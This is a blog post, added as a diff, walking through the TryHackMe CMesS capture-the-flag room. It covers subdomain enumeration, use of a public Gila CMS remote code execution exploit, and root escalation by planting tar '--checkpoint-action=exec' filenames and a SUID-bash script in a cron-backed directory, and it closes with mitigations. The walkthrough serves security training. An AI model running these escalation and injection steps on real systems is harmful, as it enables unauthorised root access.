@@ -1,0 +1,327 @@
+---
+layout: post
+title: CMesS
+date: 2026-02-17T20:18:00
+categories:
+  - TryHackMe
+tags:
+  - thm
+  - linux
+author: muhammed
+description: A comprehensive guide to exploiting Gila CMS vulnerabilities and performing Linux privilege escalation through tar wildcard cron job exploitation.
+toc: true
+pin: false
+math: false
+mermaid: false
+image: https://tryhackme-images.s3.amazonaws.com/room-icons/1516b0c85bb9f7312a88638df5b0f3af.png
+---
+
+CMesS - TryHackMe Writeup
+
+[CMesS](https://tryhackme.com/room/cmess) is a medium-difficulty CTF machine that focuses on Gila CMS exploitation, subdomain enumeration, and Linux privilege escalation through tar wildcard exploitation in cron jobs.
+
+**Difficulty**: Medium ⭐⭐  
+**Operating System**: Linux (Ubuntu 16.04)  
+**Themes**: CMS Exploitation, Subdomain Enumeration, Cron Job Privilege Escalation
+
+---
+
+## Objectives
+
+1. Enumerate subdomains and discover credentials
+2. Exploit Gila CMS authenticated RCE vulnerability
+3. Gain initial shell access
+4. Escalate from `www-data` to user `andre`
+5. Escalate to root via tar wildcard cron job exploitation
+6. Capture user and root flags
+
+---
+
+## Reconnaissance
+
+### Host Configuration
+
+Before starting, added the target IP to `/etc/hosts`:
+```bash
+nano /etc/hosts
+# Add: 10.10.70.174 cmess.thm
+```
+
+![hostfilecong](/assets/Pasted%20image%2020260217201532.png)
+
+### Nmap Scan
+
+Performed comprehensive port scanning:
+```bash
+nmap -p- -sCV -T4 10.10.70.174
+```
+
+**Results**:
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 3 disallowed entries 
+|_/src/ /themes/ /lib/
+|_http-generator: Gila CMS
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+**Key Findings**:
+- **Port 22**: SSH service
+- **Port 80**: Apache with Gila CMS
+- **robots.txt**: Reveals restricted directories
+
+---
+
+## Web Enumeration
+
+### Initial Discovery
+
+The main website displayed a standard Gila CMS blog:
+
+![maininterface](/assets/Pasted%20image%2020260217201612.png)
+
+### Directory Enumeration with Ffuf
+
+```bash
+ffuf -w /usr/share/wordlists/rockyou.txt -u http://10.10.70.174/FUZZ -fw 431
+```
+
+**Key Discovery**: `/login` directory
+
+![login](/assets/Pasted%20image%2020260217201652.png)
+
+### Subdomain/Virtual Host Enumeration
+
+Critical vulnerability found through subdomain enumeration:
+```bash
+ffuf -w /usr/share/wordlists/rockyou.txt -u http://10.10.70.174 -H "HOST: FUZZ.cmess.thm" -fw 522
+```
+
+**Subdomain Found**: `dev.cmess.thm`
+
+Added to `/etc/hosts`:
+```bash
+10.10.70.174 dev.cmess.thm
+```
+
+### Credential Discovery
+
+The `dev` subdomain revealed sensitive information:
+
+![dev subdomain](/assets/Pasted%20image%2020260217201710.png)
+
+**Credentials Extracted**:
+- Username: `andre@cmess.thm`
+- Password: `KPFTN_f2yxe%`
+
+### Admin Panel Access
+
+Used credentials to access `/admin`:
+
+![admin dashboard](/assets/Pasted%20image%2020260217201735.png)
+
+**Version Discovery**: Gila CMS 1.10.9 (vulnerable to authenticated RCE)
+
+---
+
+## Initial Access
+
+### Gila CMS RCE Exploitation
+
+Gila CMS 1.10.9 is vulnerable to authenticated remote code execution (CVE-2020-13160).
+
+**Exploit Selection**: Searchsploit revealed `51569.py`:
+```bash
+searchsploit Gila CMS 1.10.9
+# Result: 51569.py - Remote Code Execution (Authenticated)
+```
+
+**Exploit Execution**:
+```bash
+python3 51569.py
+# Enter: http://cmess.thm/admin
+# Enter: andre@cmess.thm
+# Enter: KPFTN_f2yxe%
+# Enter: LHOST and LPORT
+```
+
+**Shell Obtained**:
+```bash
+www-data@cmess:/$ whoami
+www-data
+```
+
+---
+
+## Lateral Movement
+
+### Credential Discovery
+
+Found backup password in `/opt/.password.bak`:
+```bash
+cat /opt/.password.bak
+# andres backup password
+# UQfsdCB7aAP6
+```
+
+### SSH Access as Andre
+
+```bash
+ssh andre@10.10.70.174
+Password: UQfsdCB7aAP6
+```
+
+### User Flag Capture
+
+```bash
+andre@cmess:~$ cat user.txt
+thm{c529b5d5d6ab6b430b7.........}
+```
+
+---
+
+## Privilege Escalation
+
+### Cron Job Analysis
+
+Discovered vulnerable cron job in `/etc/crontab`:
+```bash
+cat /etc/crontab
+```
+```bash
+*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
+```
+
+**Vulnerability**: Wildcard (`*`) in tar command allows command injection.
+
+### Tar Wildcard Exploitation
+
+The `tar` command has dangerous flags:
+- `--checkpoint=n`: Execute action after processing n records
+- `--checkpoint-action=ACTION`: Specify action to take at checkpoint
+
+**Exploitation Steps**:
+
+1. **Create malicious shell script**:
+   ```bash
+   echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash;' > /home/andre/backup/shell.sh
+   ```
+
+2. **Create checkpoint files**:
+   ```bash
+   touch /home/andre/backup/--checkpoint=1
+   touch '/home/andre/backup/--checkpoint-action=exec=sh shell.sh'
+   ```
+
+3. **Wait for cron execution** (runs every 2 minutes)
+
+4. **Execute SUID bash**:
+   ```bash
+   /tmp/bash -p
+   ```
+
+### Root Access Obtained
+
+```bash
+bash-4.3# whoami
+root
+```
+
+### Root Flag Capture
+
+```bash
+bash-4.3# cat /root/root.txt
+thm{9f85b7fdeb2cf96985bf5761..........}
+```
+
+---
+
+## Key Takeaways
+
+### Attack Path Summary:
+```
+Host Configuration → Port Scanning → Subdomain Enumeration → 
+Credential Discovery → Admin Panel Access → Gila CMS RCE → 
+Initial Shell → Credential Harvesting → SSH Lateral Movement → 
+Cron Job Analysis → Tar Wildcard Exploitation → Root Access
+```
+
+### Vulnerabilities Exploited:
+1. **Information Disclosure** - Credentials in dev subdomain
+2. **Gila CMS RCE (CVE-2020-13160)** - Authenticated file upload/execution
+3. **Insecure Credential Storage** - Password in backup file
+4. **Tar Wildcard Injection** - Cron job command injection
+
+### Mitigation Strategies:
+1. **For CMS Security**:
+   - Regular security updates and patching
+   - Restrict file upload functionality
+   - Implement proper file type validation
+   - Secure credential storage
+
+2. **For Cron Job Security**:
+   - Avoid wildcards in privileged commands
+   - Use absolute paths
+   - Implement command whitelisting
+   - Regular security audits of cron jobs
+
+3. **For System Security**:
+   - Principle of least privilege
+   - Secure password storage
+   - Regular system updates
+   - Network segmentation
+
+4. **For Development Environments**:
+   - Separate development and production systems
+   - Secure credential handling
+   - Regular security testing
+   - Access control implementation
+
+### Tools Used:
+- **Nmap** - Port scanning and service enumeration
+- **Ffuf** - Web directory and subdomain enumeration
+- **Searchsploit** - Vulnerability research
+- **Python Exploit (51569.py)** - Gila CMS RCE
+- **Tar** - Privilege escalation vector
+
+### Timeline of Events:
+1. **Initial Reconnaissance** - Port scanning and host configuration
+2. **Web Enumeration** - Subdomain discovery and credential extraction
+3. **CMS Exploitation** - Gila CMS RCE for initial access
+4. **Lateral Movement** - Credential discovery and SSH access
+5. **Privilege Escalation** - Tar wildcard cron job exploitation
+6. **Flag Capture** - User and root flags obtained
+
+### Alternative Attack Vectors:
+1. **Manual File Upload** - Via admin panel file manager
+2. **Different Payloads** - Various reverse shell techniques
+3. **Post-Exploitation Tools** - LinPEAS/LinEnum for enumeration
+
+---
+
+## 📚 References
+
+<div class="references">
+<ul>
+  <li><a href="#" target="https://tryhackme.com/room/cmess">Official Documentation</a></li>
+  
+</ul>
+</div>
+
+
+
+
+
+
+---
+
+##  You can find me online at:
+
+![My signature image](/assets/img/footer-signature.png)
+
+- **X (Twitter):** [Md3omer](https://x.com/Md3omer )
+- **GitHub:** [Mhdomer](https://github.comMhdomer)  
+- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/) 
+- **Tryhackme:**  [nonlouy](https://tryhackme.com/p/nonlouy)
